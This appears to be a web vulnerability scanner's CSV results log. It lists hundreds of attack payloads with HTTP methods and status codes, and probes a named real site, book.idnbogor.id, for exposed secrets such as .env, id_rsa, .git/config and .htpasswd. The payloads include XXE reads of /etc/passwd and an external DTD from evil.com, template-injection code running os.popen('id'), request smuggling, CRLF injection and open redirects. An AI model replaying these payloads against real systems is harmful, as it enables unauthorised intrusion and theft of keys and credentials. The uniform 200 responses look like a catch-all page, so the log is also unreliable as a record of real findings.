Category,Method,Status,Response Time (ms),Payload,Is Redirect,WAF Detected,WAF Type,Timestamp,URL
"LDAP Injection","DELETE",404,2076,"admin)(|(password=*))",false,false,"Unknown","",""
"HTTP Request Smuggling","GET",200,29,"Transfer-Encoding: chunked
0

GARBAGE",false,false,"Unknown","",""
"HTTP Request Smuggling","POST",404,58,"Transfer-Encoding: chunked
0

GARBAGE",false,false,"Unknown","",""
"HTTP Request Smuggling","PUT",404,86,"Transfer-Encoding: chunked
0

GARBAGE",false,false,"Unknown","",""
"HTTP Request Smuggling","DELETE",404,295,"Transfer-Encoding: chunked
0

GARBAGE",false,false,"Unknown","",""
"HTTP Request Smuggling","GET",200,327,"0

GET / HTTP/1.1
Host: example.com",false,false,"Unknown","",""
"HTTP Request Smuggling","POST",404,357,"0

GET / HTTP/1.1
Host: example.com",false,false,"Unknown","",""
"HTTP Request Smuggling","PUT",404,387,"0

GET / HTTP/1.1
Host: example.com",false,false,"Unknown","",""
"HTTP Request Smuggling","DELETE",404,419,"0

GET / HTTP/1.1
Host: example.com",false,false,"Unknown","",""
"Open Redirect","GET",200,631,"//evil.com",false,false,"Unknown","",""
"Open Redirect","POST",404,848,"//evil.com",false,false,"Unknown","",""
"Open Redirect","PUT",404,1065,"//evil.com",false,false,"Unknown","",""
"Open Redirect","DELETE",404,1093,"//evil.com",false,false,"Unknown","",""
"Open Redirect","GET",200,1123,"http://evil.com",false,false,"Unknown","",""
"Open Redirect","POST",404,1335,"http://evil.com",false,false,"Unknown","",""
"Open Redirect","PUT",404,1365,"http://evil.com",false,false,"Unknown","",""
"Open Redirect","DELETE",404,1394,"http://evil.com",false,false,"Unknown","",""
"Open Redirect","GET",200,1605,"/\evil.com",false,false,"Unknown","",""
"Open Redirect","POST",404,1637,"/\evil.com",false,false,"Unknown","",""
"Open Redirect","PUT",404,1859,"/\evil.com",false,false,"Unknown","",""
"Open Redirect","DELETE",404,2074,"/\evil.com",false,false,"Unknown","",""
"Open Redirect","GET",200,33,"//google.com%2F%2Fevil.com",false,false,"Unknown","",""
"Open Redirect","POST",404,250,"//google.com%2F%2Fevil.com",false,false,"Unknown","",""
"Open Redirect","PUT",404,280,"//google.com%2F%2Fevil.com",false,false,"Unknown","",""
"Open Redirect","DELETE",404,497,"//google.com%2F%2Fevil.com",false,false,"Unknown","",""
"Open Redirect","GET",200,526,"/login?Redirect=http://evil.com",false,false,"Unknown","",""
"Open Redirect","POST",404,555,"/login?Redirect=http://evil.com",false,false,"Unknown","",""
"Open Redirect","PUT",404,584,"/login?Redirect=http://evil.com",false,false,"Unknown","",""
"Open Redirect","DELETE",404,613,"/login?Redirect=http://evil.com",false,false,"Unknown","",""
"Open Redirect","GET",200,822,"/login?Redirect=../../../..//evil.com",false,false,"Unknown","",""
"Open Redirect","POST",404,854,"/login?Redirect=../../../..//evil.com",false,false,"Unknown","",""
"Open Redirect","PUT",404,892,"/login?Redirect=../../../..//evil.com",false,false,"Unknown","",""
"Open Redirect","DELETE",404,1109,"/login?Redirect=../../../..//evil.com",false,false,"Unknown","",""
"Sensitive Files","GET",200,1331,"https://book.idnbogor.id/.git",false,false,"Unknown","",""
"Sensitive Files","GET",200,1545,"https://book.idnbogor.id/.git/config",false,false,"Unknown","",""
"Sensitive Files","GET",200,1754,"https://book.idnbogor.id/.gitignore",false,false,"Unknown","",""
"Sensitive Files","GET",200,1987,"https://book.idnbogor.id/requirements.txt",false,false,"Unknown","",""
"Sensitive Files","GET",200,2018,"https://book.idnbogor.id/composer.json",false,false,"Unknown","",""
"Sensitive Files","GET",200,2050,"https://book.idnbogor.id/composer.lock",false,false,"Unknown","",""
"Sensitive Files","GET",200,2272,"https://book.idnbogor.id/package.json",false,false,"Unknown","",""
"Sensitive Files","GET",200,2493,"https://book.idnbogor.id/package-lock.json",false,false,"Unknown","",""
"Sensitive Files","GET",200,217,"https://book.idnbogor.id/yarn.lock",false,false,"Unknown","",""
"Sensitive Files","GET",200,251,"https://book.idnbogor.id/config.php",false,false,"Unknown","",""
"Sensitive Files","GET",403,258,"https://book.idnbogor.id/wp-config.php",false,false,"Unknown","",""
"Sensitive Files","GET",200,478,"https://book.idnbogor.id/.env",false,false,"Unknown","",""
"Sensitive Files","GET",200,697,"https://book.idnbogor.id/docker-compose.yml",false,false,"Unknown","",""
"Sensitive Files","GET",200,728,"https://book.idnbogor.id/id_rsa",false,false,"Unknown","",""
"Sensitive Files","GET",200,760,"https://book.idnbogor.id/appsettings.json",false,false,"Unknown","",""
"Sensitive Files","GET",200,761,"https://book.idnbogor.id/database.yml",false,false,"Unknown","",""
"Sensitive Files","GET",200,776,"https://book.idnbogor.id/id_rsa.pub",false,false,"Unknown","",""
"Sensitive Files","GET",200,974,"https://book.idnbogor.id/web.config",false,false,"Unknown","",""
"Sensitive Files","GET",200,1017,"https://book.idnbogor.id/.htpasswd",false,false,"Unknown","",""
"Sensitive Files","GET",200,1046,"https://book.idnbogor.id/.htaccess",false,false,"Unknown","",""
"Sensitive Files","GET",200,1077,"https://book.idnbogor.id/database.bak",false,false,"Unknown","",""
"CRLF Injection","GET",200,1123,"%0d%0aSet-Cookie: malicious=true",false,false,"Unknown","",""
"CRLF Injection","POST",404,1345,"%0d%0aSet-Cookie: malicious=true",false,false,"Unknown","",""
"CRLF Injection","PUT",404,1554,"%0d%0aSet-Cookie: malicious=true",false,false,"Unknown","",""
"CRLF Injection","DELETE",404,1582,"%0d%0aSet-Cookie: malicious=true",false,false,"Unknown","",""
"CRLF Injection","GET",200,1611,"
Location: http://malicious.com",false,false,"Unknown","",""
"CRLF Injection","POST",404,1642,"
Location: http://malicious.com",false,false,"Unknown","",""
"CRLF Injection","PUT",404,1851,"
Location: http://malicious.com",false,false,"Unknown","",""
"CRLF Injection","DELETE",404,29,"
Location: http://malicious.com",false,false,"Unknown","",""
"CRLF Injection","GET",200,248,"%0d%0aContent-Length:0",false,false,"Unknown","",""
"CRLF Injection","POST",404,458,"%0d%0aContent-Length:0",false,false,"Unknown","",""
"CRLF Injection","PUT",404,682,"%0d%0aContent-Length:0",false,false,"Unknown","",""
"CRLF Injection","DELETE",404,711,"%0d%0aContent-Length:0",false,false,"Unknown","",""
"CRLF Injection","GET",200,924,"%250d%250aContent-Length:0",false,false,"Unknown","",""
"CRLF Injection","POST",404,1137,"%250d%250aContent-Length:0",false,false,"Unknown","",""
"CRLF Injection","PUT",404,1166,"%250d%250aContent-Length:0",false,false,"Unknown","",""
"CRLF Injection","DELETE",404,1202,"%250d%250aContent-Length:0",false,false,"Unknown","",""
"UTF8/Unicode Bypass","GET",200,1417,"\u0027 OR \u00271\u0027=\u00271",false,false,"Unknown","",""
"UTF8/Unicode Bypass","POST",404,1625,"\u0027 OR \u00271\u0027=\u00271",false,false,"Unknown","",""
"UTF8/Unicode Bypass","PUT",404,1840,"\u0027 OR \u00271\u0027=\u00271",false,false,"Unknown","",""
"UTF8/Unicode Bypass","DELETE",404,1870,"\u0027 OR \u00271\u0027=\u00271",false,false,"Unknown","",""
"UTF8/Unicode Bypass","GET",200,2079,"%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",false,false,"Unknown","",""
"UTF8/Unicode Bypass","POST",404,2286,"%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",false,false,"Unknown","",""
"UTF8/Unicode Bypass","PUT",404,2314,"%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",false,false,"Unknown","",""
"UTF8/Unicode Bypass","DELETE",404,2538,"%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",false,false,"Unknown","",""
"UTF8/Unicode Bypass","GET",200,2567,"Ω OR Ω=Ω",false,false,"Unknown","",""
"UTF8/Unicode Bypass","POST",404,2594,"Ω OR Ω=Ω",false,false,"Unknown","",""
"UTF8/Unicode Bypass","PUT",404,2807,"Ω OR Ω=Ω",false,false,"Unknown","",""
"UTF8/Unicode Bypass","DELETE",404,217,"Ω OR Ω=Ω",false,false,"Unknown","",""
"XXE","GET",200,435,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","POST",404,469,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","PUT",404,499,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","DELETE",404,707,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","GET",200,737,"<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",false,false,"Unknown","",""
"XXE","POST",404,766,"<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",false,false,"Unknown","",""
"XXE","PUT",404,986,"<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",false,false,"Unknown","",""
"XXE","DELETE",404,1016,"<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",false,false,"Unknown","",""
"XXE","GET",200,1235,"<?xml version=""1.0""?><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","POST",404,1270,"<?xml version=""1.0""?><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","PUT",404,1353,"<?xml version=""1.0""?><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","DELETE",404,1563,"<?xml version=""1.0""?><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","GET",200,1594,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","POST",404,1803,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","PUT",404,2012,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","DELETE",404,2227,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","GET",200,2258,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","POST",404,2464,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","PUT",404,2676,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","DELETE",404,29,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","GET",200,243,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>",false,false,"Unknown","",""
"XXE","POST",404,451,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>",false,false,"Unknown","",""
"XXE","PUT",404,479,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>",false,false,"Unknown","",""
"XXE","DELETE",404,508,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>",false,false,"Unknown","",""
"XXE","GET",200,538,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",false,false,"Unknown","",""
"XXE","POST",404,568,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",false,false,"Unknown","",""
"XXE","PUT",404,599,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",false,false,"Unknown","",""
"XXE","DELETE",404,806,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",false,false,"Unknown","",""
"XXE","GET",200,1022,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","POST",404,1232,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","PUT",404,1446,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","DELETE",404,1476,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","GET",200,1692,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","POST",404,1900,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","PUT",404,2124,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","DELETE",404,2334,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","GET",200,2544,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","POST",404,2753,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","PUT",404,2782,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE","DELETE",404,250,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"SSTI","GET",200,281,"{{7*7}}",false,false,"Unknown","",""
"SSTI","POST",404,317,"{{7*7}}",false,false,"Unknown","",""
"SSTI","PUT",404,347,"{{7*7}}",false,false,"Unknown","",""
"SSTI","DELETE",404,376,"{{7*7}}",false,false,"Unknown","",""
"SSTI","GET",200,593,"${7*7}",false,false,"Unknown","",""
"SSTI","POST",404,625,"${7*7}",false,false,"Unknown","",""
"SSTI","PUT",404,663,"${7*7}",false,false,"Unknown","",""
"SSTI","DELETE",404,698,"${7*7}",false,false,"Unknown","",""
"SSTI","GET",200,751,"<%= 7*7 %>",false,false,"Unknown","",""
"SSTI","POST",404,966,"<%= 7*7 %>",false,false,"Unknown","",""
"SSTI","PUT",404,1175,"<%= 7*7 %>",false,false,"Unknown","",""
"SSTI","DELETE",404,1207,"<%= 7*7 %>",false,false,"Unknown","",""
"SSTI","GET",200,1241,"{{=7*7}}",false,false,"Unknown","",""
"SSTI","POST",404,1464,"{{=7*7}}",false,false,"Unknown","",""
"SSTI","PUT",404,1494,"{{=7*7}}",false,false,"Unknown","",""
"SSTI","DELETE",404,1524,"{{=7*7}}",false,false,"Unknown","",""
"SSTI","GET",200,1741,"#{7*7}",false,false,"Unknown","",""
"SSTI","POST",404,1957,"#{7*7}",false,false,"Unknown","",""
"SSTI","PUT",404,2166,"#{7*7}",false,false,"Unknown","",""
"SSTI","DELETE",404,34,"#{7*7}",false,false,"Unknown","",""
"SSTI","GET",200,71,"{{7*'7'}}",false,false,"Unknown","",""
"SSTI","POST",404,302,"{{7*'7'}}",false,false,"Unknown","",""
"SSTI","PUT",404,513,"{{7*'7'}}",false,false,"Unknown","",""
"SSTI","DELETE",404,551,"{{7*'7'}}",false,false,"Unknown","",""
"SSTI","GET",200,585,"{{config}}",false,false,"Unknown","",""
"SSTI","POST",404,816,"{{config}}",false,false,"Unknown","",""
"SSTI","PUT",404,1046,"{{config}}",false,false,"Unknown","",""
"SSTI","DELETE",404,1078,"{{config}}",false,false,"Unknown","",""
"SSTI","GET",200,1112,"{{self}}",false,false,"Unknown","",""
"SSTI","POST",404,1330,"{{self}}",false,false,"Unknown","",""
"SSTI","PUT",404,1359,"{{self}}",false,false,"Unknown","",""
"SSTI","DELETE",404,1575,"{{self}}",false,false,"Unknown","",""
"SSTI","GET",200,1613,"{{[].__class__.__mro__[1].__subclasses__()}}",false,false,"Unknown","",""
"SSTI","POST",404,1644,"{{[].__class__.__mro__[1].__subclasses__()}}",false,false,"Unknown","",""
"SSTI","PUT",404,1683,"{{[].__class__.__mro__[1].__subclasses__()}}",false,false,"Unknown","",""
"SSTI","DELETE",404,1711,"{{[].__class__.__mro__[1].__subclasses__()}}",false,false,"Unknown","",""
"SSTI","GET",200,1741,"{{().__class__.__bases__[0].__subclasses__()}}",false,false,"Unknown","",""
"SSTI","POST",404,1957,"{{().__class__.__bases__[0].__subclasses__()}}",false,false,"Unknown","",""
"SSTI","PUT",404,2172,"{{().__class__.__bases__[0].__subclasses__()}}",false,false,"Unknown","",""
"SSTI","DELETE",404,32,"{{().__class__.__bases__[0].__subclasses__()}}",false,false,"Unknown","",""
"SSTI","GET",200,250,"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",false,false,"Unknown","",""
"SSTI","POST",404,279,"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",false,false,"Unknown","",""
"SSTI","PUT",404,487,"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",false,false,"Unknown","",""
"SSTI","DELETE",404,710,"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",false,false,"Unknown","",""
"SSTI","GET",200,741,"<%={{7*7}}%>",false,false,"Unknown","",""
"SSTI","POST",404,770,"<%={{7*7}}%>",false,false,"Unknown","",""
"SSTI","PUT",404,816,"<%={{7*7}}%>",false,false,"Unknown","",""
"SSTI","DELETE",404,1024,"<%={{7*7}}%>",false,false,"Unknown","",""
"SSTI","GET",200,1056,"${{7*7}}",false,false,"Unknown","",""
"SSTI","POST",404,1090,"${{7*7}}",false,false,"Unknown","",""
"SSTI","PUT",404,1308,"${{7*7}}",false,false,"Unknown","",""
"SSTI","DELETE",404,1369,"${{7*7}}",false,false,"Unknown","",""
"SSTI","GET",200,1587,"{{request}}",false,false,"Unknown","",""
"SSTI","POST",404,1629,"{{request}}",false,false,"Unknown","",""
"SSTI","PUT",404,1697,"{{request}}",false,false,"Unknown","",""
"SSTI","DELETE",404,1916,"{{request}}",false,false,"Unknown","",""
"SSTI","GET",200,1945,"{{url_for}}",false,false,"Unknown","",""
"SSTI","POST",404,1978,"{{url_for}}",false,false,"Unknown","",""
"SSTI","PUT",404,2012,"{{url_for}}",false,false,"Unknown","",""
"SSTI","DELETE",404,218,"{{url_for}}",false,false,"Unknown","",""
"SSTI","GET",200,427,"{{cycler.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI","POST",404,645,"{{cycler.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI","PUT",404,860,"{{cycler.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI","DELETE",404,891,"{{cycler.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,1103,"param=1&param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,1136,"param=1&param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,1168,"param=1&param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,1442,"param=1&param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,1652,"user=admin&user=guest",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,1682,"user=admin&user=guest",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,1896,"user=admin&user=guest",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,1932,"user=admin&user=guest",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,2142,"id=1;id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,2357,"id=1;id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,2387,"id=1;id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,2608,"id=1;id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,2637,"id=1&&id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,2665,"id=1&&id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,2695,"id=1&&id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,28,"id=1&&id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,66,"id=1;id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,96,"id=1;id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,304,"id=1;id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,335,"id=1;id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,551,"id=1,id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,584,"id=1,id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,791,"id=1,id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,1013,"id=1,id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,1223,"id=1 id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,1448,"id=1 id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,1477,"id=1 id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,1690,"id=1 id=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,1905,"id=1&id=",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,2122,"id=1&id=",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,2337,"id=1&id=",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,2370,"id=1&id=",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,2591,"param=&param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,2621,"param=&param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,2652,"param=&param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,214,"param=&param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,242,"param=1&Param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,456,"param=1&Param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,485,"param=1&Param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,703,"param=1&Param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,926,"param[0]=1&param[1]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,958,"param[0]=1&param[1]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,988,"param[0]=1&param[1]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,1021,"param[0]=1&param[1]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,1056,"param[]=1&param[]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,1272,"param[]=1&param[]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,1488,"param[]=1&param[]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,1522,"param[]=1&param[]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,1737,"param=1&%70%61%72%61%6d=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,1767,"param=1&%70%61%72%61%6d=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,1796,"param=1&%70%61%72%61%6d=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,1824,"param=1&%70%61%72%61%6d=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,1855,"param=1&par%61m=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,2064,"param=1&par%61m=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,2272,"param=1&par%61m=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,35,"param=1&par%61m=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,244,"param.1=1&param.2=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,274,"param.1=1&param.2=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,314,"param.1=1&param.2=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,522,"param.1=1&param.2=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,562,"param=1|param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,780,"param=1|param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,988,"param=1|param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,1214,"param=1|param=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","GET",200,1425,"param[a]=1&param[b]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","POST",404,1646,"param[a]=1&param[b]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","PUT",404,1675,"param[a]=1&param[b]=2",false,false,"Unknown","",""
"HTTP Parameter Pollution","DELETE",404,1887,"param[a]=1&param[b]=2",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,1917,"X-Forwarded-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","POST",404,1947,"X-Forwarded-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","PUT",404,2163,"X-Forwarded-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","DELETE",404,2377,"X-Forwarded-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,2594,"X-Original-URL: /admin",false,false,"Unknown","",""
"Web Cache Poisoning","POST",404,2812,"X-Original-URL: /admin",false,false,"Unknown","",""
"Web Cache Poisoning","PUT",404,2840,"X-Original-URL: /admin",false,false,"Unknown","",""
"Web Cache Poisoning","DELETE",404,29,"X-Original-URL: /admin",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,61,"Cache-Control: no-cache",false,false,"Unknown","",""
"Web Cache Poisoning","POST",404,268,"Cache-Control: no-cache",false,false,"Unknown","",""
"Web Cache Poisoning","PUT",404,480,"Cache-Control: no-cache",false,false,"Unknown","",""
